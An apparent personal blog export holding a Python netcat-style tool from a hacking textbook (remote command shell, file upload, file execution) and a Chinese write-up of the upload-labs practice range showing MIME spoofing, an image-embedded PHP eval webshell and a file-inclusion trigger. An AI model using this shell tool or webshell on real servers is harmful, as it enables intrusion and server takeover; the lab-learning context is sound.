class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">listen                 = <span class="literal">False</span></span><br><span class="line">command                = <span class="literal">False</span></span><br><span class="line">upload                 = <span class="literal">False</span></span><br><span class="line">execute                = <span class="string">""</span></span><br><span class="line">target                 = <span class="string">""</span></span><br><span class="line">upload_destination     = <span class="string">""</span></span><br><span class="line">port                   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP Net Tool"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: BHP_server.py -t target_host -p port"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-l --listen  - listen on [host]:[port] for incoming connections"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-c --command -initialize a command shell"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-u --upolad=destination  - upon receiving connection ypload a file and write to [destination]"</span></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Examples:  "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -c"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\" "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./BHP_server.py -t 192.168.11.12 -p 135"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#global target</span></span><br><span class="line">    <span class="comment">#global port      </span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> len(buffer):</span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            </span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">print</span> response</span><br><span class="line">            buffer = raw_input(<span class="string">""</span>)</span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line">            </span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span>   <span class="string">"[*]    Exception! Exiting."</span></span><br><span class="line">        client.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span> :</span></span><br><span class="line">    <span class="keyword">global</span> target </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target) :</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line">    </span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">        client_socket, add = server.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                file_buffer += data</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span>%upload_destination)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span>%upload_destination)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">            client_socket.send(<span class="string">"&lt;BHP:#&gt; "</span>)</span><br><span class="line">            </span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>, <span class="string">"listen"</span>, <span class="string">"execute"</span>, <span class="string">"target"</span>, <span class="string">"port"</span>, <span class="string">"command"</span>, <span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> str(err)</span><br><span class="line">        usage()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-c"</span>, <span class="string">"--command"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:   </span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 服务器 ubuntu python网络编程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上传漏洞]]></title>
      <url>/2019/07/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><ol>
<li>阅读了GitHub上的<a href="https://github.com/c0ny1/upload-labs/blob/master/README.md#11-%E4%B8%BB%E7%95%8C%E9%9D%A2" target="_blank" rel="noopener">项目文档</a>后，稍微心里有了点数。<br>迅速clone了项目的代码后，发现是php文件，想运行要先部署环境</li>
</ol>
<ul>
<li>Windows下：<br>  推荐<a href="http://phpstudy.php.cn/download.html" target="_blank" rel="noopener">PHPStudy程序包</a>，集成了<code>Apache</code>+<code>PHP</code>+<code>MySQL</code>+<code>phpMyAdmin</code>+<code>ZendOptimizer</code>，一键安装，傻瓜式操作。</li>
<li>Linux下：<br>  我的服务器已经提前装好了<code>Apache</code>+<code>MySQL</code>+<code>phpMyAdmin</code>，可以参考我搭建服务器环境时的教程<a href="https://cloud.tencent.com/developer/labs/lab/10122" target="_blank" rel="noopener">https://cloud.tencent.com/developer/labs/lab/10122</a></li>
</ul>
<ol start="2">
<li>安装好 PHPStudy 后，找到网站根目录后，把项目的.php文件放入此目录。linux同理。<br> 打开浏览器，输入<a href="http:localhost/upload-labs-master" target="_blank" rel="noopener">http:localhost/upload-labs-master</a>,能显示被解析后的php文件，说明环境已经配置好了。</li>
</ol>
<h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><p>其实一直以来我对网页的运作方式也是一直半解， <code>PHP</code>,<code>JavaScript</code>,<code>HTML</code>,<code>css</code>什么的傻傻分不清楚,和别人聊起的时候也是一头雾水. 直到前几天刚刚把这个博客真正搭起来，才对<code>HTML</code>和<code>PHP</code>的关系有点理解了. 今天为了后面的学习, 有必要把这部分的知识好好补习下了.<br>主要参考:<a href="https://blog.csdn.net/qq_41147260/article/details/80840298" target="_blank" rel="noopener">你知道HTML、CSS、JS、Services、PHP、ASP.NET 是什么来头么？</a></p>
<p>###HTML<br><code>HTML</code>主要作用于前端(浏览器处).  以我个人的理解，<code>HTML</code>就好像是个成品,是可以直接被浏览器理解的文件. 当自己的电脑得到一个 <code>html</code>页面之后，就会对它进行解析。<code>HTML</code> 就是一种超文本标记语言。</p>
<p>###PHP<br>与<code>HTML</code>相对应, <code>PHP</code>主要应用于服务器端,主要用来写服务器脚本.其实<code>PHP</code>写成的服务器脚本本质上就是个程序, 而且是专门==处理客户端传来的数据、调用本地数据最后生成<code>HTML</code>文件的程序==。这一点上,<code>PHP</code>写成的服务器脚本就好像是个<code>HTML</code>的生成器. 当然, 服务器可以直接把预先设计好的成品<code>HTML</code>丢给客户端, 不过这样的灵活性就大大降低了, 每个人看到的同一个网页都是一模一样的, 而且网站也没法响应用户的其它请求.</p>
<p>###CSS<br>css可以对<code>html</code>网页进行渲染. 如果不用css，效果如下图，按照浏览器默认的样式显示出表格，超链接等。</p>
<figure class="image-box">
                <img src="http://p9.pstatp.com/large/47120003f1ab6a490727" alt title class>
                <p></p>
            </figure>
<p>(其实就是目前看我博客的效果……)<br>不说了, 我学css去了。(溜)</p>
<p>###Javascript<br> <code>Javascript（JS）</code>可以给页面添加一些动态的效果，比如头条的发表的标签，鼠标移上去会弹出一个小窗口，这个就是 JS 实现的效果啦。<strong>浏览器</strong>拿到这样的代码，<strong>就会解析并实现</strong>出相应的效果。且由黑字可知, JavaScript是运行在浏览器上的, 不涉及服务器.<br> 其实用来写浏览器脚本的，也不是非得JavaScript 不可，不过是各大浏览器都默认了：请用 JS 写这些动态效果的代码给我解析~</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
</blockquote>
<p>看不懂, 不过应该也没关系, 随着下面的题目应该会对这些概念有更加清晰的认识, 不妨带着问题, 开启学习之路.</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><ul>
<li>HTML负责放你需要显示的内容，</li>
<li>PHP可以输出可变化的HTML。</li>
<li>CSS可以让你的HTML更加的漂亮，比如加字体颜色加边框。</li>
<li>JS可以让你HTML+CSS组成的页面更加“生动”,粗浅的来说就是JS让页面会动。</li>
<li>webshell是以网页文件形式存在的一种命令执行环境</li>
</ul>
<h2 id="二十题题解"><a href="#二十题题解" class="headerlink" title="二十题题解"></a>二十题题解</h2><p>由于我在这个任务中负责<code>pass15</code> 至 <code>pass18</code>,所以之前的题目可能不会逐个分析, 还请见谅.<br>-&gt;<a href="http://whoisyourdaddy.cf/upload-labs-master/" target="_blank" rel="noopener">靶场</a>&lt;-<br>考虑到本站服务器安全问题, 靶场不开放提交文件功能, 请有需要的朋友按照上面的介绍自行部署靶场. </p>
<h3 id="pass1"><a href="#pass1" class="headerlink" title="pass1:"></a>pass1:</h3><p>由提示</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/pass1tip.png" alt title class>
                <p></p>
            </figure>
<p>根据上面的介绍, JavaScript只会在浏览器中运行, 所以我们在浏览器中禁用掉JavaScript就行了.<br>以chrome浏览器为例.<br>首先在pass1的页面下,点击<code>F12</code>,调出开发者工具.</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/开发者工具.png" alt title class>
                <p></p>
            </figure>
<p>然后点击<code>F1</code>,打开<code>settings</code></p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/setting.png" alt title class>
                <p></p>
            </figure>
<p>在<code>setting</code>的<code>Preferences</code>的末尾部分,有个<code>Disable JavaScript</code>,顾名思义,找的就是它了. 选中后就可以禁用JavaScript, 成功上传<code>php</code>类型的文件, 审查元素, 发现此处的图片是<code>test.php</code>, 说明成功了.</p>
<h3 id="pass2"><a href="#pass2" class="headerlink" title="pass2:"></a>pass2:</h3><p>尝试直接提交test.php, 显示文件类型不匹配.<br>查看下提示<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/pass2tips.png" alt title class>
                <p></p>
            </figure></p>
<p>好了, 什么是MIME呢?</p>
<blockquote>
<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型;在最早的HTTP协议中,没有附加的数据类型信息.所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。<br>Content-type就是我们经常在 http请求头里 response header看到的那个<br>里面包含的就是MIME信息.<br>作者：<a href="https://www.jianshu.com/p/fb5d8f03c4ed" target="_blank" rel="noopener">王进喜许三多</a></p>
</blockquote>
<p>看来MIME就是在<code>HTTP</code>数据包中标明文件类型的一个参数.<br>举几个例子<br>|类型|后缀|content-type|<br>|:—:|:—:|:—:|<br>|超文本标记语言|.html|text/html|<br>|xml文档|.xml|text/xml|<br>|XHTML文档|.xhtml|application/xhtml+xml|<br>|普通文本|.txt|text/plain|<br>|RTF文本|.rtf|application/rtf|<br>|PDF文档|.pdf|application/pdf|<br>|Microsoft Word文件|.word|application/msword|<br>|PNG图像|.png|image/png|<br>|GIF图形|.gif|image/gif|<br>|JPEG图形|.jpeg,.jpg|image/jpeg|</p>
<p>看到是在服务器端进行判断就应该知道像上道题目中, 使用浏览器的手段应该是行不通的了, 要想办法骗过服务器. 在这里, 我们使用工具<code>Burp Suite</code>对需要上传的数据包进行修改.<br>具体步骤:</p>
<ol>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能 intercept is on。<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=935ab9728f025aafd3327fc3cbecab8d/267f9e2f070828385d7923a6b599a9014c08f108.jpg" alt title class>
                <p></p>
            </figure></li>
<li>上传<code>test.php</code>的文件，提示文件类型不正确，请重新上传。<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=81f314465cda81cb4ee682c56267d0a4/8326cffc1e178a82959c8312fb03738da877e8e4.jpg" alt title class>
                <p></p>
            </figure></li>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能intercept is on。<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=935ab9728f025aafd3327fc3cbecab8d/267f9e2f070828385d7923a6b599a9014c08f108.jpg" alt title class>
                <p></p>
            </figure></li>
<li>chrome浏览器代理设置，<code>127.0.0.1:8080</code>,这里我使用的是<code>SwitchyOmega</code>插件进行快速设置。<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=75d5dcba5e43fbf2c52ca72b807fca1e/e61190ef76c6a7ef7d925194f0faaf51f2de66c8.jpg" alt title class>
                <p></p>
            </figure></li>
<li>重新选择<code>test.php</code>文件进行上传，<code>Burp Suite</code>拦截到文件上传数据包。(如果在本地部署靶场, <code>Burp Suite</code>可能会拦截不到数据包?)<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=c8bec5759d529822053338cbe7cb7b3b/b3119313b07eca80eba5c0559c2397dda04483e4.jpg" alt title class>
                <p></p>
            </figure></li>
<li>将拦截数据包中的<code>content-type:application/octet-stream</code>更改为<code>content-type:image/jpeg</code>，点击<code>forward</code>转发。<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=0a5954a7b1315c6043956ae7bdb0cbe6/9e3df8dcd100baa127b6bf094a10b912c9fc2eee.jpg" alt title class>
                <p></p>
            </figure></li>
<li>查看上传网页界面，发现文件已经上传成功。<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/baidu.jpg" alt title class>
                <p></p>
            </figure>
<h3 id="pass13"><a href="#pass13" class="headerlink" title="pass13:"></a>pass13:</h3>题目要求：<blockquote>
<p>上传图片马到服务器。<br>注意：</p>
</blockquote>
</li>
<li>保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。</li>
<li>使用<code>文件包含漏洞</code>能运行图片马中的恶意代码。</li>
<li>图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</li>
</ol>
<p>好的，什么是<code>图片马</code>？<br>百度了下相关的概念和制作方法，其实说白了，图片马就是在图片文件中入恶意代码，但依然保持文件类型是图片格式（<code>.jpg</code>,<code>.png</code>,<code>.gif</code>等）的木马文件。<br>最简单的图片马当然就是在图片中插入<code>一句话</code>生成的,</p>
<p>制作方法很简单, 随便找个图片( 以<code>jpg</code>为例 ), 以记事本打开, 在末尾加上<code>一句话</code>的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并保存下来就制作好了. ( 在某篇博客中看到, 可以只保留原文件的前三行然后再加入代码, 因为有时图片过大会影响图片马的运行. )<br>也可以用cmd, 输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  1.jpg/b+2.php/a  3.jpg</span><br></pre></td></tr></table></figure>

<p><code>1.jpg</code> 是原图片文件, <code>2.php</code>是<code>一句话</code>, <code>3.jpg</code>就是两个文件合并后的新文件.<br><code>/b</code>是以二进制形式,适用于图片音频等文件<br><code>/a</code>是ascii形式,适用于<code>txt</code>,<code>php</code>等文本文件<br><font size="2" color="green">小声bb : 然而亲测好像没有什么区别</font></p>
<p>把合成好的文件放到测试的目录下, 尝试使用菜刀连接. </p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/jpg.png" alt title class>
                <p></p>
            </figure>
<p>.<br>.<br>.<br>会发现连接不上 :|</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/error.png" alt title class>
                <p></p>
            </figure>
<p>这是因为菜刀只能和<code>php</code>,<code>asp</code>,<code>aspx</code>等脚本文件连接. </p>
<p>如果把后缀改成<code>php</code>,再次连接…</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/php.png" alt title class>
                <p></p>
            </figure>

<p>可以发现正常工作. :)<br>但是这不足以解决这个题目.<br>因为题目只能提交<code>.jpg</code>等图片文件, 所以要用题目中的<code>文件包含漏洞</code>.<br>看下题目中提供的<code>include.php</code>的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>); </span><br><span class="line">$file = $_GET[<span class="string">'file'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123; </span><br><span class="line">    <span class="keyword">include</span> $file; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>感觉<code>GET()</code>函数应该是关键点<br>百度了下, <code>GET()</code>函数在这的使用方法是在URL处获取参数.<br>比如, 我在URL<code>http://某路径/include.php</code>后加上<code>?file=test.txt</code>, 也就是<code>http://某路径/include.php?file=test.txt</code>那么当我访问这个URL时, 脚本就会自动找到<code>test.txt</code>并把其内容放到当前<code>include.php</code>中一起执行.<br>这样,我们就可以通过<code>文件包含漏洞</code>, 使服务器在运行<code>include.php</code>时把我们的木马一起运行了.</p>
<p>在浏览器中测试下,</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/ceshi.png" alt title class>
                <p></p>
            </figure>
<p>可以发现, <code>图片马</code>的数据已经被访问到了.(但是没有发现<code>php脚本</code>回显, 暂时存疑 :/ )</p>
<p>在使用菜刀尝试连接</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/sucessful.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/C.png" alt title class>
                <p></p>
            </figure>
<p>成功拿到了 <code>webshell</code>,这道题到这就算是结束了, 其它的两个图片类型应该也都差不多, 这里不多赘述. :)</p>
<h4 id="顺便提一下"><a href="#顺便提一下" class="headerlink" title="顺便提一下"></a>顺便提一下</h4><p>每次用<code>一句话</code>或者用大马得到<code>webshell</code>后, 目录下就会发现有<code>$RECYCLE.BIN</code>和system volume information这俩个文件夹. 在这里贴下相关资料:<br><a href="https://blog.csdn.net/sinat_33718563/article/details/78837510" target="_blank" rel="noopener">rs勿忘初心</a>:</p>
<blockquote>
<p><code>$RECYCLE.BIN</code> :首先说明这是系统文件 不是病毒<code>$RECYCLE.BIN</code> 不是像一个回收站，它就是回收站！每个盘都有！你在每个盘删除的东西都会留在各自盘的回收站（即 <code>$RECYCLE.BIN</code>）里，而桌面上的就是总的回收站了。各自盘里的<code>$RECYCLE.BIN</code> 再你清空桌面上的回收站后也就自动清除了！</p>
</blockquote>
<p><a href>tangpeicheng</a>:</p>
<blockquote>
<p>system volume information:<br>其中文名称可以翻译为“系统卷标信息”。这个文件夹里就存储着系统还原的备份信息。这里涉及到“系统还原”,“系统还原”是Windows XP最实用的功能之一，它采用“快照”的方式记录下系统在特定时间的状态信息，也就是所谓的“还原点”，然后在需要的时候根据这些信息加以还原。</p>
</blockquote>
<h3 id="pass14"><a href="#pass14" class="headerlink" title="pass14:"></a>pass14:</h3><p>同pass13</p>
<h3 id="pass15"><a href="#pass15" class="headerlink" title="pass15:"></a>pass15:</h3><p>同pass14<br>虽然13，14，15可以用同样的方法过关.<br>但是我们不妨仔细的分析下代码, 体会区别</p>
